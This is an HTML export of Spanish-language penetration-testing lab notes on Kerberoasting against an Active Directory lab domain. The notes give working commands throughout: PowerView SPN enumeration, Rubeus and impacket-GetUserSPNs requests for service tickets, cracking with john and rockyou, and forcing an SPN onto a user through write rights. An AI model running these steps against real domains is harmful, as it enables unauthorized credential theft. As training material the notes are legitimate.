<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>TGS-REP Roasting (Kerberoasting)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>TGS-REP Roasting (Kerberoasting)</h1><br/><p><strong><h1>¿EN QUÉ CONSISTE EL KERBEROASTING?</h1></strong></p><p></p><p>En este caso la interacción con el <strong>AuthenticationService</strong> ya no es necesaria puesto que la hemos explotado en los anteriores métodos. </p><p>Ahora nos interesa la comunicación con el <strong>TicketGrantingService</strong>.</p><p></p><p><h2>ES NECESARIO CONTAR CON UN USUARIO DENTRO DEL DOMNIO</h2></p><p></p><p>Ahora vamos a interactuar con el ticket de servicio que el TGS proporciona al usuario.</p><p></p><p>Lo que nos interesa no es que esté cifrado con la clave de servicio ya que al ser generada automáticamente por el DC no va a ser posible crackearla.</p><p>Lo que ocurre es que en la infraestructura de domino tenemos algunos servicios creados manualmente como correos, bases de datos que necesitan un usuario, etc...</p><p>Aquí explotamos las malas prácticas a la hora de crear estos servicios por parte de los administradores ya que normalmente estos usuarios de servicio son usuarios que no se acceden con frecuencia y que como son varios lo más optimo es ponerlas sencillas o similares para poder recordarlas todas.</p><p></p><p>Lo que vamos a hacer es obtener tickets de servicio para aquellos creados por los administradores y tratar de crackearlos.</p><p></p><p>Para esto es importante recordar que los servicios se identifican dentro del dominio con su SPN (ServicePrincipalName) y que tanto usuarios como computers tendran esos SPN asociados.</p><p></p><p>Si ejecutamos PowerView y vemos los servicios ejecutados por WS01:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Get-NetComputer</span> <span style="color:#000000;font-weight:700">-</span>Identity WS01</pre></div></p><p></p><p><img src="images/32-1.png" alt="images/32-1.png" /></p><p></p><p>Vemos que ofrece varios pero todos son por defecto y tendrán una contraseña bastante compleja.</p><p></p><p>Lo mismo con los usuarios:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Get-NetUser</span> <span style="color:#000000;font-weight:700">-</span>Identity krbtgt </pre></div></p><p></p><p><img src="images/32-2.png" alt="images/32-2.png" /></p><p></p><p></p><p></p><p></p><p>Vamos a simular que creamos un servicio en el DC.</p><p></p><p><img src="images/32-3.png" alt="images/32-3.png" /></p><p></p><p><img src="images/32-4.png" alt="images/32-4.png" /></p><p></p><p>Le asignamos el servicio al usuario desde Powershell:</p><p></p><p><div class="codebox"><pre><br />setspn <span style="color:#000000;font-weight:700">-</span>s MailSrvc<span style="color:#000000;font-weight:700">/</span>MS01.corp.local MailSrvc </pre></div></p><p></p><p><img src="images/32-5.png" alt="images/32-5.png" /></p><p></p><p></p><p></p><p></p><p></p><p><h2>Ahora vamos a identificar todos los usuarios del dominio que ofrecen un servicio</h2>:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Get-NetUser</span> <span style="color:#000000;font-weight:700">-</span>SPN </pre></div></p><p></p><p>Identifica todos los usuarios que ejecuten un servicio.</p><p></p><p><img src="images/32-6.png" alt="images/32-6.png" /></p><p></p><p></p><p>Vamos a solicitar al TGS el ticket de servicio de MailSrvc.</p><p></p><p>Hay diferentes maneras de ejecutar esto:</p><p><ul><li>→ <h2>→ RUBEUS:</h2></li></ul></p><p></p><p><div class="codebox"><pre><br />.<span style="color:#000000;font-weight:700">\</span>Rubeus.exe kerberoast </pre></div></p><p></p><p>Detecta automáticamente las cuentas de servicio no creadas por defecto.</p><p>Como empleado 1 hace un request del servicio al TGS y recoge el hash de la clave privada del MailSrvc</p><p></p><p><img src="images/32-7.png" alt="images/32-7.png" /></p><p></p><p></p><p><ul><li>→ <h2>→ IMPACKET:</h2></li></ul></p><p></p><p><div class="codebox"><pre><br />mpacket-GetUserSPNs corp.local<span style="color:#000000;font-weight:700">/</span>empleado1<span style="color:#000000;font-weight:700">:</span>Passw0rd1 -request</pre></div></p><p></p><p><img src="images/32-8.png" alt="images/32-8.png" /></p><p></p><p></p><p><div class="codebox"><pre><br />mpacket-GetUserSPNs corp.local<span style="color:#000000;font-weight:700">/</span>empleado1<span style="color:#000000;font-weight:700">:</span>Passw0rd1 -output hash.tgsrep</pre></div></p><p></p><p><div class="codebox"><pre><br />john hash.tgsrep</pre></div></p><p></p><p></p><p></p><p></p><p></p><p><h2>FORZAR KERBEROASTING</h2>:</p><p></p><p>Se puede forzar el añadir estás características de servicio a un usuario haciendo uso de otras explotaciones como GenericWriter y GenericAll.</p><p></p><p>En este caso vamos a configurar manualmente:</p><p></p><p><img src="images/32-9.png" alt="images/32-9.png" /></p><p></p><p>Suponemos que hemos encontrado a ese usuario y con PowerView:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#729fcf;font-weight:400">Set</span><span style="color:#000000;font-weight:700">-</span>DomainObject <span style="color:#000000;font-weight:700">-</span>Identity irena.estella <span style="color:#000000;font-weight:700">-</span><span style="color:#729fcf;font-weight:400">Set</span> @{serviceprincipalname<span style="color:#000000;font-weight:700">=</span><span style="color:#ce5c00;font-weight:400">&#39;test/cocos&#39;</span>} <span style="color:#ad7fa8;font-weight:400">-verbose</span></pre></div></p><p></p><p>Al hacer esto le asociamos un SPN al usuario y se comporta como una cuenta de servicio y podemos utilizar la misma técnica para tratar a ese usuario como servicio, pedir al TGS un ticket de servicio y obtener el hash para crackear la password</p><p></p><p>Si hacemos un nuevo:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Get-NetUser</span> <span style="color:#000000;font-weight:700">-</span>SPN</pre></div></p><p></p><p><img src="images/32-10.png" alt="images/32-10.png" /></p><p></p><p>Ahora desde Kali:</p><p></p><p><div class="codebox"><pre><br />impacket-GetUserSPNs corp.local<span style="color:#000000;font-weight:700">/</span>empleado1<span style="color:#000000;font-weight:700">:</span>Passw0rd1 -outputfile hash.tgsrep</pre></div></p><p></p><p><img src="images/32-11.png" alt="images/32-11.png" /></p><p></p><p><div class="codebox"><pre><br />john hash.tgsrep -wordlist=<span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>wordlists<span style="color:#000000;font-weight:700">/</span>rockyou.txt<br />john hash.tgsrep --show<br /></pre></div></p></div>
</body>
</html>
